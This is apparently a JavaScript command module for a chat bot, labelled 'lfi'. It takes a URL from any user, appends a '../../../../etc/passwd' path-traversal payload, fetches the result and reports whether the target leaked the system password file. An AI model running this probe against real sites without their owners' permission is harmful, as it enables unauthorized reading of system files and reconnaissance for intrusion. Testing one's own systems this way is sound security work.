const { sendMessage } = require('../handles/sendMessage');
const axios = require('axios');                                                                                       module.exports = {
   name: 'lfi',
   description: 'Test a URL for Local File Inclusion (LFI) vulnerability',                                               usage: 'lfi <url>',
   author: 'Mota - Dev',

   async execute(senderId, args, token) {                        const url = args[0];
      if (!url) {                                                   return sendMessage(senderId, { text: "Please provide a URL to test for LFI (e.g., https://example.com?page=)." }, token);
      }

      const payload = "../../../../etc/passwd"; // Common LFI payload
      const testUrl = `${url}/${encodeURIComponent(payload)}`;
      try {
         const response = await axios.get(testUrl);
         if (response.data.includes("root:x:")) {
            return sendMessage(senderId, { text: `LIF Vulnerability Found.\n\n ‹ ${testUrl} ›` }, token);
         } else {
            return sendMessage(senderId, { text: "No LFI vulnerability detected." }, token);
         }
      } catch (error) {
         console.error("Error during LFI test:", error);
         return sendMessage(senderId, { text: "Failed to test for LFI. Please try again later." }, token);
      }
   }
};
